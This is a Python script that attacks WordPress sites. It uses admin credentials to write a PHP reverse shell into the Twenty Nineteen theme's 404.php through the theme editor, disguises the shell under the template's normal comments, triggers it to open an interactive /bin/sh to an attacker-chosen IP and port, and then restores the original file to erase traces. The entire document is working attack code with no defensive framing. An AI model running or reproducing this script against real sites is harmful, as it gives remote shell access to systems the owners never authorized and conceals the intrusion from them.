#version 1.0

import requests
import re
from optparse import OptionParser

def WP_Login(session, user, passwd, target):
    data = {
            'log':user,
            'pwd':passwd,
            'wp-submit':'Log in'
            }
    r = session.post(target + '/wp-login.php', data=data, allow_redirects=False)
    COOKIES = r.cookies
    r = session.get(target + '/wp-admin/theme-editor.php?file=404.php&theme=twentynineteen', cookies=COOKIES)
    nonce_value= re.search('name=\"nonce"\s+value=\"\w{10}"', r.text).group().split('\"')[3]
    return COOKIES, nonce_value

def Load_Shell(session, cookies, nonce, target, reverse_ip, reverse_port):
    shell = '''<?php
	/**
	 * The template for displaying 404 pages (not found)
	 *
	 * @link https://codex.wordpress.org/Creating_an_Error_404_Page
	 *
	 * @package WordPress
	 * @subpackage Twenty_Nineteen
	 * @since Twenty Nineteen 1.0
	 */
	$sock=fsockopen("'''
    shell = shell + reverse_ip + '",' + reverse_port
    shell = shell + ''');$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);
	get_header();
	?>

		<div id="primary" class="content-area">
			<main id="main" class="site-main">

				<div class="error-404 not-found">
					<header class="page-header">
						<h1 class="page-title"><?php _e( 'Oops! That page can&rsquo;t be found.', 'twentynineteen' ); ?></h1>
					</header><!-- .page-header -->

					<div class="page-content">
						<p><?php _e( 'It looks like nothing was found at this location. Maybe try a search?', 'twentynineteen' ); ?></p>
						<?php get_search_form(); ?>
					</div><!-- .page-content -->
				</div><!-- .error-404 -->

			</main><!-- #main -->
		</div><!-- #primary -->

	<?php
	get_footer();'''
    data = {
            'nonce':nonce,
            'action':'edit-theme-plugin-file',
            'file':'404.php',
            'theme':'twentynineteen',
            'newcontent':shell,
            }
    r = session.post(target + '/wp-admin/admin-ajax.php', cookies=session.cookies, data=data)

def Execute_Shell(target):
    requests.get(target + '/wp-content/themes/twentynineteen/404.php')

def Clean_Shell(session, cookies, nonce, target):
    no_shell = '''<?php
	/**
	 * The template for displaying 404 pages (not found)
	 *
	 * @link https://codex.wordpress.org/Creating_an_Error_404_Page
	 *
	 * @package WordPress
	 * @subpackage Twenty_Nineteen
	 * @since Twenty Nineteen 1.0
	 */
	
	get_header();
	?>

		<div id="primary" class="content-area">
			<main id="main" class="site-main">

				<div class="error-404 not-found">
					<header class="page-header">
						<h1 class="page-title"><?php _e( 'Oops! That page can&rsquo;t be found.', 'twentynineteen' ); ?></h1>
					</header><!-- .page-header -->

					<div class="page-content">
						<p><?php _e( 'It looks like nothing was found at this location. Maybe try a search?', 'twentynineteen' ); ?></p>
						<?php get_search_form(); ?>
					</div><!-- .page-content -->
				</div><!-- .error-404 -->

			</main><!-- #main -->
		</div><!-- #primary -->

	<?php
	get_footer();'''
    data = {
            'nonce':nonce,
            'action':'edit-theme-plugin-file',
            'file':'404.php',
            'theme':'twentynineteen',
            'newcontent':no_shell,
            }
    r = session.post(target + '/wp-admin/admin-ajax.php', cookies=session.cookies, data=data)

def __main__():
    parser = OptionParser()
    parser.add_option("--target", help="URL for base wordpress install (ex: http://domain.com/wordpress)",dest="target")
    parser.add_option("--user", help="Username to authenticate with", dest="user")
    parser.add_option("--pass", help="Password to authenitcate with", dest="passwd")
    parser.add_option("--revaddr", help="IP address for reverse shell to connect to", dest="rev_ip")
    parser.add_option("--revport", help="Port for reverse shell to connect to", dest="rev_port")

    (options, args) = parser.parse_args()

    s = requests.session()
    auth_cookie, nonce = WP_Login(s, options.user, options.passwd, options.target)
    Load_Shell(s, auth_cookie, nonce, options.target, options.rev_ip, options.rev_port)
    Execute_Shell(options.target)
    Clean_Shell(s, auth_cookie, nonce, options.target)

__main__()


